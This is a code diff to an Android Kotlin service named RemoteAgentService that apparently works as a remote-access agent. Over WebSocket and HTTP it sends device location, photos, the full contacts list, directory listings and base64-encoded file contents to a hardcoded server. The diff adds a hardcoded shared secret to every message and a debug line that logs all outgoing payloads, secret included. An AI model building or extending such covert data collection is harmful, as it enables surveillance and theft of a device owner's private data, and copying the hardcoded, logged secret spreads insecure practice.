@@ -67,6 +67,7 @@ class RemoteAgentService : Service() {
 
     private var wsClient: WebSocketClient? = null
     private val deviceId = "android-device-001" // give a unique ID per device
+    private val DEVICE_SECRET = "very-strong-device-secret"
 
     companion object {
         private const val SERVER_IP = "192.168.31.50"
@@ -121,7 +122,16 @@ class RemoteAgentService : Service() {
                     reconnecting = false
 
                     // 📌 Safe register message
-                    safeSend("""{"type":"hello","deviceId":"$deviceId"}""")
+                    val registerMsg = """
+                        {
+                          "type": "hello",
+                          "deviceId": "$deviceId",
+                          "auth": "$DEVICE_SECRET"
+                        }
+                        """.trimIndent()
+
+                    safeSend(registerMsg)
+
 
                     // 🔹 Start ping keepalive
                     startPingTimer()
@@ -353,7 +363,8 @@ class RemoteAgentService : Service() {
                 """{
                 "type":"location",
                 "deviceId":"$deviceId",
-                "error":"Location permission not granted"
+                "error":"Location permission not granted",
+                "auth": "$DEVICE_SECRET"
             }"""
             )
             return
@@ -378,7 +389,8 @@ class RemoteAgentService : Service() {
                 """{
                 "type":"location",
                 "deviceId":"$deviceId",
-                "error":"No location available"
+                "error":"No location available",
+                "auth": "$DEVICE_SECRET"
             }"""
             )
             return
@@ -390,7 +402,8 @@ class RemoteAgentService : Service() {
           "deviceId": "$deviceId",
           "lat": ${bestLocation.latitude},
           "lng": ${bestLocation.longitude},
-          "accuracy": ${bestLocation.accuracy}
+          "accuracy": ${bestLocation.accuracy},
+          "auth": "$DEVICE_SECRET"
         }
     """.trimIndent()
 
@@ -429,6 +442,10 @@ class RemoteAgentService : Service() {
                         conn.requestMethod = "POST"
                         conn.doOutput = true
                         conn.setRequestProperty("Content-Type", "image/jpeg")
+                        conn.setRequestProperty(
+                            "Authorization",
+                            "Device $DEVICE_SECRET"
+                        )
                         conn.outputStream.use { it.write(bytes) }
                         conn.responseCode
                         conn.disconnect()
@@ -486,6 +503,10 @@ class RemoteAgentService : Service() {
                     requestMethod = "POST"
                     doOutput = true
                     setRequestProperty("Content-Type", "application/json")
+                    setRequestProperty(
+                        "Authorization",
+                        "Device $DEVICE_SECRET"
+                    )
                 }
 
                 val jsonBody = """{"deviceId":"$deviceId","contacts":$contactsJson}"""
@@ -494,11 +515,11 @@ class RemoteAgentService : Service() {
                 val code = conn.responseCode
                 println("📤 Contacts uploaded: $code")
 
-                safeWsSend("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
+                safeWsSend("{\"type\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
 
             } catch (ex: Exception) {
                 ex.printStackTrace()
-                safeWsSend("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
+                safeWsSend("{\"type\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
             }
         }.start()
     }
@@ -538,6 +559,7 @@ class RemoteAgentService : Service() {
             if (ws != null && ws.isOpen) {
                 val json = JSONObject(data).toString()
                 ws.send(json)
+                println("WS SEND JSON: $json")
             } else {
                 println("⚠️ WS not connected — skipping WS send: $data")
             }
@@ -557,7 +579,8 @@ class RemoteAgentService : Service() {
                 mapOf(
                     "type" to "file_list_result",
                     "path" to path,
-                    "error" to "Path not found"
+                    "error" to "Path not found",
+                    "auth" to DEVICE_SECRET
                 )
             )
             return
@@ -574,11 +597,13 @@ class RemoteAgentService : Service() {
         sendWS(
             mapOf(
                 "type" to "file_list_result",
+                "auth" to DEVICE_SECRET,
                 "path" to path,
                 "items" to items
             )
         )
     }
+
 
 
     private fun handleFileReadWS(path: String) {
@@ -590,7 +615,8 @@ class RemoteAgentService : Service() {
                 mapOf(
                     "type" to "file_read_result",
                     "path" to path,
-                    "error" to "File not found"
+                    "error" to "File not found",
+                    "auth" to DEVICE_SECRET
                 )
             )
             return
@@ -604,7 +630,8 @@ class RemoteAgentService : Service() {
                 mapOf(
                     "type" to "file_read_result",
                     "path" to path,
-                    "data" to base64
+                    "data" to base64,
+                    "auth" to DEVICE_SECRET
                 )
             )
         } catch (e: Exception) {
@@ -613,7 +640,8 @@ class RemoteAgentService : Service() {
                 mapOf(
                     "type" to "file_read_result",
                     "path" to path,
-                    "error" to e.message
+                    "error" to e.message,
+                    "auth" to DEVICE_SECRET
                 )
             )
         }
